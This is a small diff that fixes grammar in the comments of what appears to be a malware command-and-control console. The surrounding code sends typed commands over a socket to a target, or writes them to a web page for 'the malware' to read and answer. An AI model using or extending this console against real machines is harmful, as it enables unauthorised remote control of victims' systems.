@@ -50,7 +50,7 @@ class interacting(Cmd):
         prompt = messagealert().interactpromp(self.HOST, self.PORT)
         command = input(prompt)
         #part responsible for command history and autoComplete
-        #work only on unix
+        #works only on unix
         storeCommandPath = os.path.expanduser("./history/commandHistory")
 
         if os.path.exists(storeCommandPath):
@@ -81,7 +81,7 @@ class interacting(Cmd):
         #quit interacting shell and go back to main menu
         elif command == "exit":
             return False
-        #all command that aren't listed above are sent to the target
+        #all commands that aren't listed above are sent to the target
         else:
             self.conn.send(command.encode())
             print("send "+command)
@@ -107,7 +107,7 @@ class HTTPinteracting(Cmd):
         prompt = messagealert().interactpromp(self.HOST, self.PORT)
         command = input(prompt)
         #part responsible for command history and autoComplete
-        #work only on unix
+        #works only on unix
         storeCommandPath = os.path.expanduser("./history/commandHistory")
 
         if os.path.exists(storeCommandPath):
@@ -134,8 +134,8 @@ class HTTPinteracting(Cmd):
             return False
 
         else:
-            #all command not listed above are sent and displayed on the web page
-            #of the server the malware will read it and sent a response
+            #all commands not listed above are sent and displayed on the web page
+            #of the server. The malware will read it and sent a response
             index = open(self.path, 'w')
             index.write(str(datetime.datetime.now())+"||"+command)
             index.close()
